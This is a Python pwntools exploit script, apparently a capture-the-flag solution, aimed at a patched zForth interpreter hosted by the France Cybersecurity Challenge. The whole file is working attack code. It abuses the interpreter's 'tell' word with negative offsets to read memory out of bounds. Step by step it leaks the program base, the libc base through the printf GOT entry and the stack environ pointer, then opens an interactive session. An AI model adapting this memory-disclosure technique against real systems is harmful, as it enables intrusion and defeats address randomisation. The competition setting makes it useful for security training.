#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="i386", os="linux")
context.log_level = 'info'

# shortcuts
def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./zforth_patched')
libc = ELF('./libc.so.6')

host, port = "challenges.france-cybersecurity-challenge.fr", "2105"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path+' ./core.zf', shell=True)

sla('used\n', '-300 4 tell')
exe.address = u32(p.recvuntil('\n', drop=True))-0x6074
logleak('prog base', exe.address)

sl(str(exe.got['printf']-exe.sym['dict'])+' 4 tell')
libc.address = u32(p.recvuntil('\n', drop=True)) - libc.sym['printf']
logbase()

sl(str(-((exe.address+0x61a0)+(0x100000000-(libc.address+0x1e7348))) )+' 80 tell')
buff = p.recv(80)
environ = u32(buff[0x48:0x4c])
logleak('stack environ', environ)

sl(str(-((exe.address+0x61a0)+(0x100000000-environ)) )+' 10000 tell')

p.interactive()

